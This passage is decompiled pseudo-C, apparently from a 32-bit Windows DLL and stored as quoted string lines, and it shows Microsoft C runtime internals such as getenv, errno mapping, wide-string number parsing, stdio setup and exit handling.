    "  v1 = _fclose_internal(Stream, (struct __crt_cached_ptd_host *)v3);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v3);",
    "  return v1;",
    "}",
    "",
    "",
    "int __cdecl sub_1001DDF4(char *String2)",
    "{",
    "  int v2; // [esp+10h] [ebp-1Ch]",
    "",
    "  if ( String2 && sub_10020321(String2, 0x7FFF) < 0x7FFFu )",
    "  {",
    "    __acrt_lock(11);",
    "    v2 = common_getenv_nolock<char>(String2);",
    "    __acrt_unlock(11);",
    "    return v2;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _invalid_parameter_noinfo();",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "const char *__cdecl common_getenv_nolock<char>(char *String2)",
    "{",
    "  const char **v1; // edi",
    "  size_t v2; // esi",
    "  const char *v3; // ecx",
    "",
    "  v1 = (const char **)sub_1001F4B9();",
    "  if ( v1 && String2 )",
    "  {",
    "    v2 = strlen(String2);",
    "    while ( 1 )",
    "    {",
    "      v3 = *v1;",
    "      if ( !*v1 )",
    "        break;",
    "      if ( strlen(*v1) > v2 && v3[v2] == 61 && !_strnicoll(v3, String2, v2) )",
    "        return &(*v1)[v2 + 1];",
    "      ++v1;",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_1001DEE0(char *String2)",
    "{",
    "  return sub_1001DDF4(String2);",
    "}",
    "",
    "",
    "_DWORD *__cdecl sub_1001DEEB(unsigned int a1, int a2, unsigned int a3)",
    "{",
    "  unsigned int v3; // ecx",
    "  unsigned int v4; // edx",
    "  unsigned int v5; // esi",
    "  int v6; // ebx",
    "  unsigned int v7; // ebx",
    "  _DWORD *result; // eax",
    "  unsigned int v9; // [esp+Ch] [ebp-Ch]",
    "  unsigned int v10; // [esp+10h] [ebp-8h]",
    "  unsigned int v11; // [esp+14h] [ebp-4h]",
    "",
    "  v3 = a3;",
    "  v4 = 0;",
    "  v5 = a1;",
    "  v9 = a3 - 1;",
    "  while ( v3 >> 1 )",
    "  {",
    "    v6 = (v3 >> 1) - 1;",
    "    if ( (v3 & 1) != 0 )",
    "      v6 = v3 >> 1;",
    "    v10 = v6 + v4;",
    "    v11 = *(_DWORD *)(a2 + 8 * (v6 + v4));",
    "    v5 = a1;",
    "    if ( a1 == v11 )",
    "      return (_DWORD *)(a2 + 8 * (v6 + v4));",
    "    v3 >>= 1;",
    "    if ( a1 < v11 )",
    "      v3 = v6;",
    "    v7 = v10 - 1;",
    "    if ( a1 >= v11 )",
    "    {",
    "      v4 = v10 + 1;",
    "      v7 = v9;",
    "    }",
    "    v9 = v7;",
    "    if ( v4 > v7 )",
    "      return 0;",
    "  }",
    "  if ( !v3 )",
    "    return 0;",
    "  result = (_DWORD *)(a2 + 8 * v4);",
    "  if ( v5 != *result )",
    "    return 0;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1001DF6A(unsigned int a1)",
    "{",
    "  _DWORD *v2; // eax",
    "",
    "  if ( !a1 )",
    "    goto LABEL_7;",
    "  if ( a1 <= 0xD )",
    "    return *(_DWORD *)&aNull[8 * a1 + 4];",
    "  if ( a1 <= 0x718 )",
    "  {",
    "    v2 = sub_1001DEEB(a1, (int)&unk_10031C30, 0x2Du);",
    "    if ( v2 )",
    "      return v2[1];",
    "  }",
    "LABEL_7:",
    "  if ( a1 - 19 > 0x11 )",
    "    return a1 - 188 > 0xE ? 22 : 8;",
    "  return 13;",
    "}",
    "",
    "",
    "int *__cdecl __acrt_errno_map_os_error(unsigned int a1)",
    "{",
    "  int v1; // esi",
    "  int *result; // eax",
    "",
    "  *(_DWORD *)sub_1001E010() = a1;",
    "  v1 = sub_1001DF6A(a1);",
    "  result = (int *)sub_1001E025();",
    "  *result = v1;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl __acrt_errno_map_os_error_ptd(unsigned int a1, int a2)",
    "{",
    "  int result; // eax",
    "",
    "  *(_BYTE *)(a2 + 36) = 1;",
    "  *(_DWORD *)(a2 + 32) = a1;",
    "  result = sub_1001DF6A(a1);",
    "  *(_BYTE *)(a2 + 28) = 1;",
    "  *(_DWORD *)(a2 + 24) = result;",
    "  return result;",
    "}",
    "",
    "",
    "void *sub_1001E010()",
    "{",
    "  int v0; // edx",
    "  void *result; // eax",
    "",
    "  v0 = sub_1001FFFD();",
    "  result = &unk_1003F0E4;",
    "  if ( v0 )",
    "    return (void *)(v0 + 20);",
    "  return result;",
    "}",
    "",
    "",
    "void *sub_1001E025()",
    "{",
    "  int v0; // edx",
    "  void *result; // eax",
    "",
    "  v0 = sub_1001FFFD();",
    "  result = &unk_1003F0E0;",
    "  if ( v0 )",
    "    return (void *)(v0 + 16);",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl sub_1001E03A(__crt_cached_ptd_host *a1, wint_t *a2, wint_t **a3, int a4, char a5)",
    "{",
    "  wint_t v5; // si",
    "  bool v6; // zf",
    "  char v7; // bl",
    "  wint_t *v8; // edi",
    "  unsigned int v9; // ecx",
    "  int v10; // edx",
    "  int v11; // eax",
    "  int v12; // eax",
    "  unsigned int v13; // ecx",
    "  int v14; // eax",
    "  unsigned int v15; // eax",
    "  unsigned int v16; // edi",
    "  int v17; // eax",
    "  unsigned __int16 v18; // cx",
    "  unsigned int v19; // ecx",
    "  int v20; // ecx",
    "  unsigned int v21; // edx",
    "  bool v22; // cl",
    "  bool v23; // cf",
    "  int v25; // esi",
    "  int v26; // [esp-8h] [ebp-18h]",
    "  wint_t *v27; // [esp+8h] [ebp-8h]",
    "  unsigned int v28; // [esp+Ch] [ebp-4h]",
    "",
    "  if ( !unknown_libname_17(&a2) )",
    "    goto LABEL_6;",
    "  if ( a4 && (a4 < 2 || a4 > 36) )",
    "  {",
    "    *((_BYTE *)a1 + 28) = 1;",
    "    *((_DWORD *)a1 + 6) = 22;",
    "    _invalid_parameter_internal(0, 0, 0, 0, 0, (struct __acrt_ptd **)a1);",
    "LABEL_6:",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return 0;",
    "  }",
    "  v28 = 0;",
    "  v27 = a2;",
    "  v5 = *a2;",
    "  v6 = *((_BYTE *)a1 + 20) == 0;",
    "  ++a2;",
    "  if ( v6 )",
    "    __crt_cached_ptd_host::update_locale_slow(a1);",
    "  while ( iswctype(v5, 8u) )",
    "    v5 = *a2++;",
    "  v7 = a5 | 2;",
    "  if ( v5 == 45 || (v7 = a5, v5 == 43) )",
    "  {",
    "    v5 = *a2;",
    "    v8 = ++a2;",
    "  }",
    "  else",
    "  {",
    "    v8 = a2;",
    "  }",
    "  v9 = a4;",
    "  v10 = 16;",
    "  if ( a4 && a4 != 16 )",
    "    goto LABEL_93;",
    "  if ( v5 >= 0x30u )",
    "  {",
    "    if ( v5 < 0x3Au )",
    "    {",
    "      v11 = v5 - 48;",
    "      goto LABEL_72;",
    "    }",
    "    if ( v5 >= 0xFF10u )",
    "    {",
    "      if ( v5 < 0xFF1Au )",
    "      {",
    "        v11 = v5 - 65296;",
    "LABEL_72:",
    "        if ( v11 != -1 )",
    "          goto LABEL_80;",
    "      }",
    "    }",
    "    else if ( v5 >= 0x660u )",
    "    {",
    "      if ( v5 < 0x66Au )",
    "      {",
    "        v11 = v5 - 1632;",
    "        goto LABEL_72;",
    "      }",
    "      if ( v5 >= 0x6F0u )",
    "      {",
    "        if ( v5 < 0x6FAu )",
    "        {",
    "          v11 = v5 - 1776;",
    "          goto LABEL_72;",
    "        }",
    "        if ( v5 >= 0x966u )",
    "        {",
    "          if ( v5 < 0x970u )",
    "          {",
    "            v11 = v5 - 2406;",
    "            goto LABEL_72;",
    "          }",
    "          if ( v5 >= 0x9E6u )",
    "          {",
    "            if ( v5 < 0x9F0u )",
    "            {",
    "              v11 = v5 - 2534;",
    "              goto LABEL_72;",
    "            }",
    "            if ( v5 >= 0xA66u )",
    "            {",
    "              if ( v5 < 0xA70u )",
    "              {",
    "                v11 = v5 - 2662;",
    "                goto LABEL_72;",
    "              }",
    "              if ( v5 >= 0xAE6u )",
    "              {",
    "                if ( v5 < 0xAF0u )",
    "                {",
    "                  v11 = v5 - 2790;",
    "                  goto LABEL_72;",
    "                }",
    "                if ( v5 >= 0xB66u )",
    "                {",
    "                  if ( v5 < 0xB70u )",
    "                  {",
    "                    v11 = v5 - 2918;",
    "                    goto LABEL_72;",
    "                  }",
    "                  if ( v5 >= 0xC66u )",
    "                  {",
    "                    if ( v5 < 0xC70u )",
    "                    {",
    "                      v11 = v5 - 3174;",
    "                      goto LABEL_72;",
    "                    }",
    "                    if ( v5 >= 0xCE6u )",
    "                    {",
    "                      if ( v5 < 0xCF0u )",
    "                      {",
    "                        v11 = v5 - 3302;",
    "                        goto LABEL_72;",
    "                      }",
    "                      if ( v5 >= 0xD66u )",
    "                      {",
    "                        if ( v5 < 0xD70u )",
    "                        {",
    "                          v11 = v5 - 3430;",
    "                          goto LABEL_72;",
    "                        }",
    "                        if ( v5 >= 0xE50u )",
    "                        {",
    "                          if ( v5 < 0xE5Au )",
    "                          {",
    "                            v11 = v5 - 3664;",
    "                            goto LABEL_72;",
    "                          }",
    "                          if ( v5 >= 0xED0u )",
    "                          {",
    "                            if ( v5 < 0xEDAu )",
    "                            {",
    "                              v11 = v5 - 3792;",
    "                              goto LABEL_72;",
    "                            }",
    "                            if ( v5 >= 0xF20u )",
    "                            {",
    "                              if ( v5 < 0xF2Au )",
    "                              {",
    "                                v11 = v5 - 3872;",
    "                                goto LABEL_72;",
    "                              }",
    "                              if ( v5 >= 0x1040u )",
    "                              {",
    "                                if ( v5 < 0x104Au )",
    "                                {",
    "                                  v11 = v5 - 4160;",
    "                                  goto LABEL_72;",
    "                                }",
    "                                if ( v5 >= 0x17E0u )",
    "                                {",
    "                                  if ( v5 < 0x17EAu )",
    "                                  {",
    "                                    v11 = v5 - 6112;",
    "                                    goto LABEL_72;",
    "                                  }",
    "                                  if ( v5 >= 0x1810u && v5 < 0x181Au )",
    "                                  {",
    "                                    v11 = v5 - 6160;",
    "                                    goto LABEL_72;",
    "                                  }",
    "                                }",
    "                              }",
    "                            }",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "        }",
    "      }",
    "    }",
    "  }",
    "  v12 = v5;",
    "  if ( v5 < 0x41u || v5 > 0x5Au )",
    "  {",
    "    v13 = v5 - 97;",
    "    if ( v13 > 0x19 )",
    "    {",
    "      v9 = a4;",
    "      goto LABEL_88;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v13 = v5 - 97;",
    "  }",
    "  if ( v13 <= 0x19 )",
    "    v12 = v5 - 32;",
    "  v9 = a4;",
    "  v11 = v12 - 55;",
    "LABEL_80:",
    "  if ( v11 )",
    "  {",
    "LABEL_88:",
    "    v26 = 10;",
    "    goto LABEL_89;",
    "  }",
    "  v14 = *v8;",
    "  a2 = v8 + 1;",
    "  if ( v14 == 120 || v14 == 88 )",
    "  {",
    "    v5 = v8[1];",
    "    a2 = v8 + 2;",
    "    if ( a4 )",
    "      v10 = a4;",
    "    v9 = v10;",
    "    goto LABEL_92;",
    "  }",
    "  __crt_strtox::c_string_character_source<wchar_t>::unget(&a2, v14);",
    "  v9 = a4;",
    "  v26 = 8;",
    "LABEL_89:",
    "  v15 = v26;",
    "  if ( v9 )",
    "    v15 = v9;",
    "  v9 = v15;",
    "LABEL_92:",
    "  a4 = v9;",
    "LABEL_93:",
    "  v16 = 0xFFFFFFFF / v9;",
    "  while ( 1 )",
    "  {",
    "    v17 = 48;",
    "    if ( v5 < 0x30u )",
    "      goto LABEL_132;",
    "    if ( v5 < 0x3Au )",
    "      goto LABEL_131;",
    "    v17 = 65296;",
    "    if ( v5 >= 0xFF10u )",
    "    {",
    "      v18 = -230;",
    "LABEL_130:",
    "      if ( v5 < v18 )",
    "      {",
    "LABEL_131:",
    "        v19 = v5 - v17;",
    "        if ( v19 != -1 )",
    "          goto LABEL_140;",
    "        goto LABEL_132;",
    "      }",
    "      goto LABEL_132;",
    "    }",
    "    v17 = 1632;",
    "    if ( v5 >= 0x660u )",
    "    {",
    "      if ( v5 < 0x66Au )",
    "        goto LABEL_131;",
    "      v17 = 1776;",
    "      if ( v5 >= 0x6F0u )",
    "      {",
    "        if ( v5 < 0x6FAu )",
    "          goto LABEL_131;",
    "        v17 = 2406;",
    "        if ( v5 >= 0x966u )",
    "        {",
    "          if ( v5 < 0x970u )",
    "            goto LABEL_131;",
    "          v17 = 2534;",
    "          if ( v5 >= 0x9E6u )",
    "          {",
    "            if ( v5 < 0x9F0u )",
    "              goto LABEL_131;",
    "            v17 = 2662;",
    "            if ( v5 >= 0xA66u )",
    "            {",
    "              if ( v5 < 0xA70u )",
    "                goto LABEL_131;",
    "              v17 = 2790;",
    "              if ( v5 >= 0xAE6u )",
    "              {",
    "                if ( v5 < 0xAF0u )",
    "                  goto LABEL_131;",
    "                v17 = 2918;",
    "                if ( v5 >= 0xB66u )",
    "                {",
    "                  if ( v5 < 0xB70u )",
    "                    goto LABEL_131;",
    "                  v17 = 3174;",
    "                  if ( v5 >= 0xC66u )",
    "                  {",
    "                    if ( v5 < 0xC70u )",
    "                      goto LABEL_131;",
    "                    v17 = 3302;",
    "                    if ( v5 >= 0xCE6u )",
    "                    {",
    "                      if ( v5 < 0xCF0u )",
    "                        goto LABEL_131;",
    "                      v17 = 3430;",
    "                      if ( v5 >= 0xD66u )",
    "                      {",
    "                        if ( v5 < 0xD70u )",
    "                          goto LABEL_131;",
    "                        v17 = 3664;",
    "                        if ( v5 >= 0xE50u )",
    "                        {",
    "                          if ( v5 < 0xE5Au )",
    "                            goto LABEL_131;",
    "                          v17 = 3792;",
    "                          if ( v5 >= 0xED0u )",
    "                          {",
    "                            if ( v5 < 0xEDAu )",
    "                              goto LABEL_131;",
    "                            v17 = 3872;",
    "                            if ( v5 >= 0xF20u )",
    "                            {",
    "                              if ( v5 < 0xF2Au )",
    "                                goto LABEL_131;",
    "                              v17 = 4160;",
    "                              if ( v5 >= 0x1040u )",
    "                              {",
    "                                if ( v5 < 0x104Au )",
    "                                  goto LABEL_131;",
    "                                v17 = 6112;",
    "                                if ( v5 >= 0x17E0u )",
    "                                {",
    "                                  if ( v5 < 0x17EAu )",
    "                                    goto LABEL_131;",
    "                                  v17 = 6160;",
    "                                  if ( v5 >= 0x1810u )",
    "                                  {",
    "                                    v18 = 6170;",
    "                                    goto LABEL_130;",
    "                                  }",
    "                                }",
    "                              }",
    "                            }",
    "                          }",
    "                        }",
    "                      }",
    "                    }",
    "                  }",
    "                }",
    "              }",
    "            }",
    "          }",
    "        }",
    "      }",
    "    }",
    "LABEL_132:",
    "    if ( ((v20 = v5, v5 < 0x41u) || v5 > 0x5Au) && (v5 < 0x61u || v5 > 0x7Au) )",
    "    {",
    "      v19 = -1;",
    "    }",
    "    else",
    "    {",
    "      if ( (unsigned __int16)(v5 - 97) <= 0x19u )",
    "        v20 = v5 - 32;",
    "      v19 = v20 - 55;",
    "    }",
    "LABEL_140:",
    "    if ( v19 >= a4 )",
    "      break;",
    "    v21 = a4 * v28 + v19;",
    "    v22 = v21 < a4 * v28;",
    "    v23 = v16 < v28;",
    "    v28 = v21;",
    "    v7 |= (4 * (v23 || v22)) | 8;",
    "    v5 = *a2++;",
    "  }",
    "  __crt_strtox::c_string_character_source<wchar_t>::unget(&a2, v5);",
    "  if ( (v7 & 8) != 0 )",
    "  {",
    "    v25 = v28;",
    "    if ( __crt_strtox::is_overflow_condition<unsigned long>(v7, v28) )",
    "    {",
    "      *((_BYTE *)a1 + 28) = 1;",
    "      *((_DWORD *)a1 + 6) = 34;",
    "      if ( (v7 & 1) != 0 )",
    "      {",
    "        if ( (v7 & 2) != 0 )",
    "        {",
    "          if ( a3 )",
    "            *a3 = a2;",
    "          return 0x80000000;",
    "        }",
    "        else",
    "        {",
    "          if ( a3 )",
    "            *a3 = a2;",
    "          return 0x7FFFFFFF;",
    "        }",
    "      }",
    "      v25 = -1;",
    "    }",
    "    else if ( (v7 & 2) != 0 )",
    "    {",
    "      v25 = -v28;",
    "    }",
    "    if ( a3 )",
    "      *a3 = a2;",
    "    return v25;",
    "  }",
    "  if ( a3 )",
    "    *a3 = v27;",
    "  return 0;",
    "}",
    "",
    "",
    "int __cdecl sub_1001E65D(int a1, _DWORD *a2, int a3)",
    "{",
    "  wint_t **v3; // ecx",
    "  int v4; // esi",
    "  wint_t **v6; // [esp-10h] [ebp-40h] BYREF",
    "  wint_t **v7; // [esp-Ch] [ebp-3Ch]",
    "  int v8; // [esp-8h] [ebp-38h]",
    "  int v9; // [esp-4h] [ebp-34h]",
    "  _BYTE v10[44]; // [esp+4h] [ebp-2Ch] BYREF",
    "",
    "  __crt_cached_ptd_host::__crt_cached_ptd_host((__crt_cached_ptd_host *)v10, 0);",
    "  v9 = 1;",
    "  v8 = a3;",
    "  v7 = v3;",
    "  v6 = v3;",
    "  unknown_libname_8(&v6, a1, a2);",
    "  v4 = sub_1001E03A((__crt_cached_ptd_host *)v10, (wint_t *)v6, v7, v8, v9);",
    "  __crt_cached_ptd_host::~__crt_cached_ptd_host((__crt_cached_ptd_host *)v10);",
    "  return v4;",
    "}",
    "",
    "",
    "int __cdecl __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_0fec1a7b3f42a53036604e18c2d5e07e_,__crt_win32_buffer_no_resizing>(",
    "        LPCWCH lpWideCharStr,",
    "        int a2,",
    "        int a3,",
    "        unsigned int a4)",
    "{",
    "  int result; // eax",
    "  unsigned int v5; // eax",
    "  DWORD v6; // eax",
    "  int v7; // eax",
    "  DWORD LastError; // eax",
    "",
    "  if ( lpWideCharStr )",
    "  {",
    "    if ( *lpWideCharStr )",
    "    {",
    "      v5 = sub_10023952(a4, 0, lpWideCharStr, -1, 0, 0, 0, 0);",
    "      if ( v5 )",
    "      {",
    "        if ( v5 <= *(_DWORD *)(a2 + 12) || (result = unknown_libname_21(v5)) == 0 )",
    "        {",
    "          v7 = unknown_libname_20(a4, lpWideCharStr, *(LPSTR *)(a2 + 8), *(_DWORD *)(a2 + 12));",
    "          if ( v7 )",
    "          {",
    "            *(_DWORD *)(a2 + 16) = v7 - 1;",
    "            return 0;",
    "          }",
    "          else",
    "          {",
    "            LastError = GetLastError();",
    "            __acrt_errno_map_os_error(LastError);",
    "            return *(_DWORD *)sub_1001E025();",
    "          }",
    "        }",
    "      }",
    "      else",
    "      {",
    "        v6 = GetLastError();",
    "        __acrt_errno_map_os_error(v6);",
    "        return *(_DWORD *)sub_1001E025();",
    "      }",
    "    }",
    "    else if ( *(_DWORD *)(a2 + 12) || (result = unknown_libname_21(1)) == 0 )",
    "    {",
    "      **(_BYTE **)(a2 + 8) = 0;",
    "      result = 0;",
    "      *(_DWORD *)(a2 + 16) = 0;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    __crt_win32_buffer<char,__crt_win32_buffer_no_resizing>::set_to_nullptr(a2);",
    "    return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "int __stdcall unknown_libname_20(unsigned int a1, LPCWCH lpWideCharStr, LPSTR lpMultiByteStr, int cbMultiByte)",
    "{",
    "}// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_21(int this, int a2)",
    "{",
    "}int __thiscall __crt_win32_buffer<char,__crt_win32_buffer_no_resizing>::set_to_nullptr(int this)",
    "{",
    "  int result; // eax",
    "",
    "  result = 0;",
    "  if ( *(_BYTE *)(this + 20) )",
    "    *(_BYTE *)(this + 20) = 0;",
    "  *(_DWORD *)(this + 8) = 0;",
    "  *(_DWORD *)(this + 12) = 0;",
    "  *(_DWORD *)(this + 16) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl  abort()",
    "{",
    "  int v0; // ebx",
    "  int v1; // edi",
    "  int v2; // esi",
    "",
    "  if ( __acrt_get_sigabrt_handler() )",
    "    raise(22);",
    "  if ( (byte_1003F0E8 & 2) != 0 )",
    "  {",
    "    if ( IsProcessorFeaturePresent(0x17u) )",
    "      __fastfail(7u);",
    "    __acrt_call_reportfault(v0, v1, v2, 3, 1073741845, 1);",
    "  }",
    "  _exit(3);",
    "}",
    "",
    "",
    "int __acrt_initialize_stdio()",
    "{",
    "  int v0; // eax",
    "  int v2; // edi",
    "  _DWORD *v3; // esi",
    "  int v4; // eax",
    "",
    "  v0 = dword_10040214;",
    "  if ( !dword_10040214 )",
    "  {",
    "    v0 = 512;",
    "LABEL_5:",
    "    dword_10040214 = v0;",
    "    goto LABEL_6;",
    "  }",
    "  if ( dword_10040214 < 3 )",
    "  {",
    "    v0 = 3;",
    "    goto LABEL_5;",
    "  }",
    "LABEL_6:",
    "  Block = (void *)sub_10023CF0(v0, 4);",
    "  _free_base(0);",
    "  if ( !Block )",
    "  {",
    "    dword_10040214 = 3;",
    "    Block = (void *)sub_10023CF0(3, 4);",
    "    _free_base(0);",
    "    if ( !Block )",
    "      return -1;",
    "  }",
    "  v2 = 0;",
    "  v3 = &unk_1003F0F0;",
    "  do",
    "  {",
    "    sub_10021DC3(v3 + 8, 4000, 0);",
    "    *((_DWORD *)Block + v2) = v3;",
    "    v4 = *((_DWORD *)&lpCriticalSection[v2 >> 6][1].DebugInfo + 14 * (v2 & 0x3F));",
    "    if ( v4 == -1 || v4 == -2 || !v4 )",
    "      v3[4] = -2;",
    "    v3 += 14;",
    "    ++v2;",
    "  }",
    "  while ( v3 != (_DWORD *)&unk_1003F198 );",
    "  return 0;",
    "}",
    "",
    "",
    "void __acrt_uninitialize_stdio()",
    "{",
    "  int i; // esi",
    "",
    "  sub_10022924();",
    "  _fcloseall();",
    "  for ( i = 0; i != 12; i += 4 )",
    "  {",
    "    __acrt_stdio_free_buffer_nolock(*(_DWORD *)((char *)Block + i));",
    "    DeleteCriticalSection((LPCRITICAL_SECTION)(*(_DWORD *)((char *)Block + i) + 32));",
    "  }",
    "  _free_base(Block);",
    "  Block = 0;",
    "}",
    "",
    "",
    "void __cdecl _lock_file(FILE *Stream)",
    "{",
    "  EnterCriticalSection((LPCRITICAL_SECTION)&Stream[1]);",
    "}",
    "",
    "",
    "void __cdecl _unlock_file(FILE *Stream)",
    "{",
    "  LeaveCriticalSection((LPCRITICAL_SECTION)&Stream[1]);",
    "}",
    "",
    "",
    "int __cdecl sub_1001E950(int a1, int a2)",
    "{",
    "  return sub_10023CF0(a1, a2);",
    "}",
    "",
    "",
    "int __cdecl _callnewh(size_t Size)",
    "{",
    "  _PNH new_handler; // eax",
    "",
    "  new_handler = _query_new_handler();",
    "  return new_handler && ((int (__thiscall *)(_PNH, size_t))new_handler)(new_handler, Size) != 0;",
    "}",
    "",
    "",
    "int __cdecl sub_1001E9A0(int a1)",
    "{",
    "  int result; // eax",
    "",
    "  result = a1;",
    "  dword_10040220 = a1;",
    "  return result;",
    "}",
    "",
    "",
    "_PNH __cdecl _query_new_handler()",
    "{",
    "  int (__cdecl *v1)(size_t); // [esp+10h] [ebp-1Ch]",
    "",
    "  __acrt_lock(0);",
    "  v1 = (int (__cdecl *)(size_t))unknown_libname_22(dword_10040220);",
    "  __acrt_unlock(0);",
    "  return v1;",
    "}",
    "",
    "",
    "_PNH __cdecl _set_new_handler(_PNH NewHandler)",
    "{",
    "  int (__cdecl *v2)(size_t); // [esp+10h] [ebp-1Ch]",
    "",
    "  __acrt_lock(0);",
    "  v2 = (int (__cdecl *)(size_t))unknown_libname_22(dword_10040220);",
    "  dword_10040220 = unknown_libname_23(NewHandler);",
    "  __acrt_unlock(0);",
    "  return v2;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "int __cdecl unknown_libname_22(int a1)",
    "{",
    "}// Microsoft VisualC universal runtime",
    "uintptr_t __cdecl unknown_libname_23(int a1)",
    "{",
    "}int __cdecl _seh_filter_dll(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr)",
    "{",
    "  if ( ExceptionNum == -529697949 )",
    "    return _seh_filter_exe(0xE06D7363, ExceptionPtr);",
    "  else",
    "    return 0;",
    "}",
    "",
    "",
    "int __cdecl _seh_filter_exe(unsigned int ExceptionNum, struct _EXCEPTION_POINTERS *ExceptionPtr)",
    "{",
    "  _DWORD *v2; // eax",
    "  _DWORD *v3; // esi",
    "  int v4; // edx",
    "  _DWORD *v5; // ecx",
    "  int v6; // eax",
    "  void (__cdecl *v8)(int, int); // edi",
    "  int v9; // edx",
    "  int v10; // eax",
    "  int v11; // ebx",
    "  int v12; // eax",
    "  int v13; // [esp+8h] [ebp-4h]",
    "",
    "  v2 = (_DWORD *)sub_1001FFFD();",
    "  v3 = v2;",
    "  if ( !v2 )",
    "    return 0;",
    "  v4 = *v2;",
    "  v5 = (_DWORD *)*v2;",
    "  v6 = *v2 + 144;",
    "  if ( *v3 == v6 )",
    "    return 0;",
    "  while ( *v5 != ExceptionNum )",
    "  {",
    "    v5 += 3;",
    "    if ( v5 == (_DWORD *)v6 )",
    "      return 0;",
    "  }",
    "  if ( !v5 )",
    "    return 0;",
    "  v8 = (void (__cdecl *)(int, int))v5[2];",
    "  if ( !v8 )",
    "    return 0;",
    "  if ( v8 == (void (__cdecl *)(int, int))5 )",
    "  {",
    "    v5[2] = 0;",
    "    return 1;",
    "  }",
    "  if ( v8 != (void (__cdecl *)(int, int))1 )",
    "  {",
    "    v13 = v3[1];",
    "    v3[1] = ExceptionPtr;",
    "    if ( v5[1] != 8 )",
    "    {",
    "      v5[2] = 0;",
    "      ((void (__cdecl *)(_DWORD))v8)(v5[1]);",
    "      goto LABEL_38;",
    "    }",
    "    v9 = v4 + 36;",
    "    v10 = v9 + 108;",
    "    while ( v9 != v10 )",
    "    {",
    "      *(_DWORD *)(v9 + 8) = 0;",
    "      v9 += 12;",
    "    }",
    "    v11 = v3[2];",
    "    if ( *v5 > 0xC0000091 )",
    "    {",
    "      switch ( *v5 )",
    "      {",
    "        case 0xC0000092:",
    "          v12 = 138;",
    "          goto LABEL_35;",
    "        case 0xC0000093:",
    "          v12 = 133;",
    "          goto LABEL_35;",
    "        case 0xC00002B4:",
    "          v12 = 142;",
    "          goto LABEL_35;",
    "      }",
    "      v12 = v3[2];",
    "      if ( *v5 == -1073741131 )",
    "      {",
    "        v12 = 141;",
    "        goto LABEL_35;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      switch ( *v5 )",
    "      {",
    "        case 0xC0000091:",
    "          v12 = 132;",
    "          goto LABEL_35;",
    "        case 0xC000008D:",
    "          v12 = 130;",
    "          goto LABEL_35;",
    "        case 0xC000008E:",
    "          v12 = 131;",
    "          goto LABEL_35;",
    "        case 0xC000008F:",
    "          v12 = 134;",
    "          goto LABEL_35;",
    "      }",
    "      v12 = v3[2];",
    "      if ( *v5 == -1073741680 )",
    "      {",
    "        v12 = 129;",
    "LABEL_35:",
    "        v3[2] = v12;",
    "      }",
    "    }",
    "    v8(8, v12);",
    "    v3[2] = v11;",
    "LABEL_38:",
    "    v3[1] = v13;",
    "  }",
    "  return -1;",
    "}",
    "",
    "",
    "int __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_4fdada1b837b2abbf20876fac97688ad_,_lambda_b57350f2640456a0859d250846f69caf_ &,_lambda_eed5e4f92b5b7d55fa22c48c484aaa54_>(",
    "        _DWORD *a1,",
    "        int a2,",
    "        _DWORD *a3)",
    "{",
    "  __acrt_lock(*a1);",
    "  _lambda_6e4b09c48022b2350581041d5f6b0c4c_::operator()(a2);",
    "  return __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "void __thiscall _lambda_6e4b09c48022b2350581041d5f6b0c4c_::operator()(int **this)",
    "{",
    "  int v2; // eax",
    "  void (__thiscall *v3)(_DWORD, _DWORD, _DWORD, _DWORD); // esi",
    "  int v4; // [esp+14h] [ebp-20h]",
    "",
    "  if ( !byte_1004022C )",
    "  {",
    "    _InterlockedExchange(&dword_10040224, 1);",
    "    v2 = **this;",
    "    if ( v2 )",
    "    {",
    "      if ( v2 == 1 )",
    "        _execute_onexit_table(&stru_10040354);",
    "    }",
    "    else",
    "    {",
    "      if ( dword_10040228 != v4 )",
    "      {",
    "        v3 = (void (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD))unknown_libname_22(dword_10040228);",
    "        v3(v3, 0, 0, 0);",
    "      }",
    "      _execute_onexit_table(&stru_10040348);",
    "    }",
    "    if ( !**this )",
    "      _initterm((_PVFV *)&dword_100301D0, (_PVFV *)&dword_100301E0);",
    "    _initterm((_PVFV *)&dword_100301E4, (_PVFV *)&dword_100301E8);",
    "    if ( !*this[1] )",
    "    {",
    "      byte_1004022C = 1;",
    "      *(_BYTE *)this[2] = 1;",
    "    }",
    "  }",
    "}",
    "",
    "",
    "void __cdecl common_exit(UINT uExitCode, enum _crt_exit_cleanup_mode a2, enum _crt_exit_return_mode a3)",
    "{",
    "  _DWORD v3[3]; // [esp+4h] [ebp-24h] BYREF",
    "  int v4; // [esp+10h] [ebp-18h] BYREF",
    "  char v5[6]; // [esp+14h] [ebp-14h] BYREF",
    "  char v6; // [esp+1Bh] [ebp-Dh] BYREF",
    "  int v7; // [esp+24h] [ebp-4h]",
    "",
    "  if ( a3 == _crt_exit_terminate_process && (unsigned __int8)__scrt_is_managed_app() )",
    "    try_cor_exit_process(uExitCode);",
    "  v6 = 0;",
    "  v3[0] = &a2;",
    "  v3[1] = &a3;",
    "  v3[2] = &v6;",
    "  v7 = 0;",
    "  *(_DWORD *)v5 = 2;",
    "  v4 = 2;",
